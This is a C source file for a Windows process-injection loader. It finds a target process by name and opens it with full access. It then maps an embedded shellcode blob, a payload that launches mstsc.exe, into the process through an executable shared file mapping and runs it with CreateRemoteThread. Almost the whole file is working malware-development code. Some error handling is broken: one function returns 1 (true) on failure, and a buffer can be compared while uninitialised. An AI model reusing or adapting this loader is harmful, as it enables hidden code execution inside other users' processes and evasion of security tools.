/*
 * Explanation:
 *  - Performs remote mapping injection, it performs process enumeration and if the target process is found it will inject its map object into the process
 */

#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include <memoryapi.h>
#include <tchar.h>
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "OneCore.lib")

unsigned char ShellcodeRemote[] = {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
                             0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
                             0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                             0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
                             0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
                             0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
                             0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
                             0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                             0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
                             0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
                             0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
                             0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
                             0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                             0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
                             0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
                             0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
                             0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
                             0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                             0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
                             0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
                             0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
                             0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
                             0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6d,0x73,0x74,
                             0x73,0x63,0x2e,0x65,0x78,0x65,0x00};

// Function performs remote mapping injection
// Parameter: hProcess -> Handle to the remote process (target process)
// Parameter: pPayload -> Hold the start (base) address of the shellcode
// Parameter: sPayloadSize -> Hold the size of the shellcode in bytes
// Parameter: ppAddress -> Receive mapped memory base address
BOOL RemoteMapInjection(_In_ HANDLE hProcess, _In_ PBYTE pPayload, _In_ SIZE_T sPayloadSize, _Out_ PVOID* ppAddress) {
    // Creating file mapping object with RWX permissions, which allows us to inject our payload later on.
    // Parameter: INVALID_HANDLE_VALUE -> creates a shared memory region that other processes can access
    // Parameter: NULL -> Handle can't be inherited, file mapping object is not associated with an existing file on disk
    // Parameter: PAGE_EXECUTE_READWRITE -> Allows us to read/write and execute our mapped object (inject our shellcode)
    // Parameter: 0 -> Specifying the maximum size of the file mapping object.
    // Parameter: sPayloadSize -> specified the size of our shellcode
    // Parameter: "0xBinary" -> Specified the name of the file mapping object
    HANDLE hObject = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sPayloadSize, "0xBinary");
    if (!hObject) {
        printf("[!] CreateFileMapping Failed With Error Code: %lu \n", GetLastError());
        return 1;
    }

    // Map payload into memory
    // Parameter: hObject -> Handle to file mapping object (Handle to the previous API call)
    // Parameter: FILE_MAP_WRITE -> Which type of access to the mapped object
    // Parameter: 0, 0 -> Both combines make it a 64-bit object
    // Parameter: sPayloadSize -> Number of bytes to map (size of shellcode)
    PVOID pLocalMap = MapViewOfFile(hObject, FILE_MAP_WRITE, 0, 0, sPayloadSize);
    if (!pLocalMap) {
        printf("[!] MapViewOfFile Failed With Error Code: %lu \n", GetLastError());
        return 1;
    }

    printf("[+] Local Mapping Base Address: 0x%p\n", pLocalMap);

    // Copy shellcode to the local map address
    PVOID hCopy = memcpy(pLocalMap, pPayload, sPayloadSize);
    if (!hCopy) {
        printf("[!] Copying Payload Failed!\n");
    } else {
        printf("[+] Successfully Copied Payload Into Local Mapped Address\n");
    }

    printf("[+] Mapping To Remote Process ... \n");

    PVOID pRemoteMap = MapViewOfFile2(hObject, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READWRITE);
    if (!pRemoteMap) {
        printf("[!] mapViewFile2 Failed With Error Code: %lu \n", GetLastError());
        return FALSE;
    }
    printf("[+] Remote Mapping Base Address: 0x%p \n", pRemoteMap);

    // Assign Remote Map Address to the remote address
    *ppAddress = pRemoteMap;
    CloseHandle(hObject);

    return TRUE;
}

// Function that takes a snapshot and, based on the provided ProcessName,
// it will inject our payload into that remote process
// Parameter: szProcessName -> Hold the Process name
// Parameter: dwProcessId -> Keeps track of the process ID
// Parameter: hProcess -> Handle to the target process
BOOL GetRemoteProcess(_In_ LPWSTR szProcessName, _Out_ DWORD* dwProcessId, _Out_ HANDLE* hProcess) {
    // Initialize structure
    PROCESSENTRY32W Proc = { sizeof(PROCESSENTRY32W) };

    // Takes a snapshot of all the current processes that are running, the 2nd parameter indicates the current process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error Code: %lu \n", GetLastError());
        CloseHandle(hSnapshot);
        return FALSE;
    }

    // Retrieve information about the first process that is captured inside the 'snapshot'
    if (!Process32FirstW(hSnapshot, &Proc)) {
        printf("[!] Process32First Failed With Error Code: %lu \n", GetLastError());
        return FALSE;
    }

    do {
        WCHAR LowerName[MAX_PATH * 2];

        // By accessing this member allows us to retrieve the name of the executable file inside the process
        if (Proc.szExeFile[0] != L'\0') {
            // Assigns the length of the name of the executable file and assigns it to dwSize
            DWORD dwSize = lstrlenW(Proc.szExeFile);
            DWORD i = 0;
            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

            if (dwSize < MAX_PATH * 2) {
                // Iterate through executable file names
                for (; i < dwSize; i++)
                    // Converts the name of the executable file inside the process to lowercase
                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
                // Null terminate name, makes sure that the next executable file name inside the process is empty and starts clean
                LowerName[i++] = '\0';
            }
        }

        // Compare if the user-provided process name is inside the snapshot
        if (wcscmp(LowerName, szProcessName) == 0) {
            // Saved Process ID to Pointer
            *dwProcessId = Proc.th32ProcessID;

            // Open the remote process
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (!*hProcess) {
                printf("[!] OpenProcess Failed With Error Code: %lu \n", GetLastError());
                return FALSE;
            }
            break;
        }
        // Enumerate the next process
    } while (Process32NextW(hSnapshot, &Proc));

    return TRUE;
}

// Entry point of the program
int wmain(int argc, wchar_t* argv[]) {
    HANDLE hProcess, hThread = NULL;
    PVOID pAddress = NULL;
    DWORD dwProcessId = (DWORD)0;

    // Check if the correct number of command-line arguments is provided
    if (argc < 2) {
        wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
        return 1;
    }

    // Search for the process ID of the specified process name
    wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[1]);
    if (!GetRemoteProcess(argv[1], &dwProcessId, &hProcess)) {
        wprintf(L"[!] Process Not Found!\n");
        return 1;
    }
    printf("[+] Found Target Process Pid: %lu \n", dwProcessId);
    printf("[+] Press <Enter> To Execute Payload ... \n");

    // Perform remote mapping injection
    if (!RemoteMapInjection(hProcess, ShellcodeRemote, sizeof(ShellcodeRemote), &pAddress)) {
        wprintf(L"[!] RemoteMapInjection Has Failed!\n");
        return 1;
    }
    printf("\t[+] Completed!\n");

    // Create a remote thread to execute the injected payload
    hThread = CreateRemoteThread(hProcess, NULL, 0, pAddress, NULL, 0, NULL);
    if (!hThread) {
        wprintf(L"[!] CreateRemoteThread Failed With Error Code: %lu \n", GetLastError());
        return 1;
    }

    printf("[+] Press <Enter> To Exit\n");
    getchar();

    return 0;
}